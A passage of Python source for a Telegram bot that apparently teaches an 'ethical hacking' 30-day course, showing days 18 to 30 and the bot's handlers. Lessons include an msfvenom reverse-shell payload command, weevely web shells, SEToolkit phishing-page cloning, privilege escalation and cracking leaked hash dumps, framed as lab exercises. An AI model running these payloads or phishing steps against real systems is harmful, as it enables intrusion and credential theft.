    "2. Access shell via browser\n"
    "3. Use `weevely` to gain access\n\n"
    "*✅ Outcome:* Able to use and manage a web shell session.",

  "day19": "*📅 Day 19: Client-Side Attacks & Social Engineering*\n\n"
    "Fool the human — the weakest link in cybersecurity.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Social Engineering\n"
    "- Creating fake login pages\n"
    "- USB Rubber Ducky, Phishing Kits\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `SEToolkit` to clone a login page\n"
    "2. Host a phishing page on localhost\n"
    "3. Send fake link via LAN or email (lab only)\n\n"
    "*✅ Outcome:* Understand social engineering and phishing strategies.",

  "day20": "*📅 Day 20: Malware Basics*\n\n"
    "Create, analyze, and understand basic malware behavior.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Types of Malware\n"
    "- Common Techniques\n"
    "- Payload Generation with msfvenom\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `msfvenom` to create payload\n"
    "   Example: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > payload.exe`\n"
    "2. Setup listener in Metasploit\n"
    "3. Run on VM to test (do NOT use on real systems)\n\n"
    "*✅ Outcome:* Able to generate and test simple payloads in a safe lab.",

    "day21": "*📅 Day 21: Windows Hacking*\n\n"
    "Understand Windows-specific vulnerabilities and techniques.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Windows privilege escalation paths\n"
    "- Exploiting services and misconfigurations\n"
    "- Using PowerShell for exploitation\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Enumerate Windows system info: `systeminfo`, `whoami`, `net user`\n"
    "2. Use `winPEAS` or `PowerUp` for enumeration\n"
    "3. Try local exploit (MS10-092 or similar in lab)\n\n"
    "*✅ Outcome:* Can analyze and attempt privilege escalation on Windows targets.",

  "day22": "*📅 Day 22: Linux Hacking*\n\n"
    "Focus on hacking Linux-based systems.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Linux enumeration and privilege escalation\n"
    "- Exploiting SUID, cron jobs, and writable scripts\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Check for SUID binaries: `find / -perm -4000 2>/dev/null`\n"
    "2. Exploit writable cron job or misconfigured scripts\n"
    "3. Use `linPEAS` to find privilege escalation paths\n\n"
    "*✅ Outcome:* Can enumerate and exploit common Linux privilege escalation vectors.",

  "day23": "*📅 Day 23: Web App Hacking - XSS, CSRF, IDOR*\n\n"
    "Deep dive into modern web vulnerabilities.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Cross-Site Scripting (XSS)\n"
    "- CSRF (Cross-Site Request Forgery)\n"
    "- Insecure Direct Object References (IDOR)\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Practice XSS in DVWA and PortSwigger labs\n"
    "2. Simulate CSRF in a form submission\n"
    "3. Exploit IDOR by changing object IDs in URLs\n\n"
    "*✅ Outcome:* Can identify and exploit common web application flaws.",

  "day24": "*📅 Day 24: Cryptography Basics*\n\n"
    "Understand the use of encryption and its weaknesses.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Hashing vs Encryption\n"
    "- Common algorithms (MD5, SHA1, AES)\n"
    "- Cracking hashes with `hashcat`, `john`\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Generate and crack hashes using `john`\n"
    "2. Create AES encrypted messages using Python\n"
    "3. Try cracking leaked hash dumps\n\n"
    "*✅ Outcome:* Understand how cryptography can be used and abused in hacking.",

  "day25": "*📅 Day 25: Bug Bounty 101*\n\n"
    "Step into the world of legal hacking and rewards.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Bug Bounty\n"
    "- Platforms: HackerOne, Bugcrowd\n"
    "- Vulnerability Disclosure Process\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Create an account on HackerOne or Bugcrowd\n"
    "2. Read 5 disclosed reports\n"
    "3. Try recon on a public program\n\n"
    "*✅ Outcome:* Get started in bug bounty hunting and reporting.",

  "day26": "*📅 Day 26: Vulnerability Scanning & Reporting*\n\n"
    "Learn how to scan and document findings professionally.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Tools: Nessus, OpenVAS, Nikto\n"
    "- Writing quality reports\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Scan with `nikto`, `nmap --script vuln`, or OpenVAS\n"
    "2. Create a PDF report with impact and remediation\n\n"
    "*✅ Outcome:* Able to generate, interpret scans and document vulnerabilities.",

  "day27": "*📅 Day 27: Malware Analysis Basics*\n\n"
    "Analyze malware behavior in a sandboxed environment.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Static vs Dynamic analysis\n"
    "- Tools: strings, binwalk, Cuckoo Sandbox\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Analyze suspicious files with `strings` and `file`\n"
    "2. Run malware in Cuckoo sandbox VM\n"
    "3. Extract indicators of compromise (IOCs)\n\n"
    "*✅ Outcome:* Can perform basic malware analysis and extract behavior.",

  "day28": "*📅 Day 28: Red Team vs Blue Team*\n\n"
    "Understand both offense and defense in cybersecurity.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Red Team (Attackers) TTPs\n"
    "- Blue Team (Defenders) techniques\n"
    "- Detection and logging\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Simulate attacks with Metasploit and monitor logs\n"
    "2. Use Splunk/ELK for detection\n\n"
    "*✅ Outcome:* Gain perspective on defense and offense synergy.",

  "day29": "*📅 Day 29: Full Hack Simulation*\n\n"
    "Test your combined skills in a full scenario.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Recon to exploitation to privilege escalation\n"
    "- Data exfiltration and cleanup\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Choose a vulnerable VM (TryHackMe, VulnHub)\n"
    "2. Perform full chain: recon, exploit, escalate, exfiltrate\n\n"
    "*✅ Outcome:* Ready to conduct end-to-end penetration tests.",

  "day30": "*📅 Day 30: Graduation & Next Steps*\n\n"
    "You’ve completed the journey — where do you go next?\n\n"
    "*🧠 Topics Covered:*\n"
    "- Certifications: OSCP, CEH, PNPT\n"
    "- Career Paths: Red Teamer, Pentester, Analyst\n"
    "- Building a Portfolio\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Setup GitHub to document your learning\n"
    "2. Contribute to open-source security tools\n"
    "3. Apply for internships or research roles\n\n"
    "*✅ Outcome:* Equipped to move into real-world hacking and security roles.",

}


def get_keyboard(topic):
    buttons = [[InlineKeyboardButton(text, callback_data=data)] for text, data in topics.get(topic, [])]
    if topic != "main":
        buttons.append([InlineKeyboardButton("⬅️ Back", callback_data="main")])
    return InlineKeyboardMarkup(buttons)


# --- /start Handler ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Hey! I am *H4cker Bot* 🤖\n\nI'm here to teach you Ethical Hacking and inspire your cybersecurity journey! Choose a topic below:",
        parse_mode="Markdown",
        reply_markup=get_keyboard("main")
    )


# --- Greeting Handler (hi/hello) ---
async def greet_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message.text.lower().strip()
    if msg in ["hi", "hello", "hii", "/start"]:
        await start(update, context)


# --- Callback Query Handler for Buttons ---
async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    topic_key = query.data

    if topic_key in topics:
        await query.message.reply_text(
            text=content.get(topic_key, f"*{topic_key.capitalize()} Topics:*"),
            parse_mode="Markdown",
            reply_markup=get_keyboard(topic_key)
        )
    elif topic_key in content:
        await query.message.reply_text(
            text=content[topic_key],
            parse_mode="Markdown",
            # reply_markup=get_keyboard("main")
        )
    else:
        await query.message.reply_text("❌ Invalid option. Please try again.")

async def keyword_responder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message.text.lower().strip()
    if msg.startswith("/"):
        msg = msg[1:]  # Remove command slash if present

    # Check exact match
    if msg in content:
        await update.message.reply_text(content[msg], parse_mode="Markdown")
        return

    # Try fuzzy match
    matches = difflib.get_close_matches(msg, content.keys(), n=1, cutoff=0.4)
    if matches:
        await update.message.reply_text(
            f"🔍 Showing result for *{matches[0]}*:\n\n{content[matches[0]]}",
            parse_mode="Markdown"
        )
        return

    # Not found
    await update.message.reply_text("❌ I couldn't find info on that. Try typing a valid hacking keyword or use /start.")

async def dynamic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command = update.message.text[1:].lower()  # remove `/` and lowercase
    if command in content:
        await update.message.reply_text(content[command], parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ I don't have content for that command.")

async def owner_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "*🤖 H4cker Bot Owners & Creators:*\n\n"
        "👨‍💻 *Ankit Kushwaha*\n"
        "• *Role:* Ethical Hacker | Full-Stack Developer\n"
        "• *Telegram:* [@H4cker_ank](https://t.me/H4cker_ank)\n"
        "• *GitHub:* [github.com/ankitkushwaha-ank](https://github.com/ankitkushwaha-ank)\n"
        "• *Email:* ankitkushwaha.ank@gmail.com\n\n"

        "👩‍💻 *Aayushi Kumari*\n"
        "• *Role:* Security Researcher | Cybersecurity Enthusiast\n"
        "• *Telegram:* [@Outlier](https://t.me/)\n"
        "• *GitHub:* [github.com/Aashi-code77](https://github.com/Aashi-code77)\n"
        "• *Email:* pandaoutlier@gmail.com\n\n"

        "💡 *About:* We created *H4cker Bot* to make cybersecurity learning accessible, structured, and fun. This bot provides a 30-day roadmap, tool-based tutorials, and career guidance for aspiring ethical hackers.\n\n"
        "_Keep exploring, keep learning, and always hack ethically!_ 🔐✨",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "*🆘 Help Menu:*\n\n"
        "Use the following commands to interact with the bot:\n"
        "/start : Start the bot and see main topics\n"
        "/owner : Get information about the bot owner\n"
        "/help : Show this help message\n\n"
        "Type keywords like 'nmap', 'linux command', etc. to get quick tips\n\n"
        "Use commands like /day1, /day2, etc. for daily learning content",
        parse_mode="Markdown"
    )

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_buttons))
    app.add_handler(CommandHandler("owner", owner_info))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, keyword_responder))

    for key in content.keys():
        app.add_handler(CommandHandler(key, dynamic_command_handler))

    print("🚀 H4cker Bot is running...")
    app.run_polling()
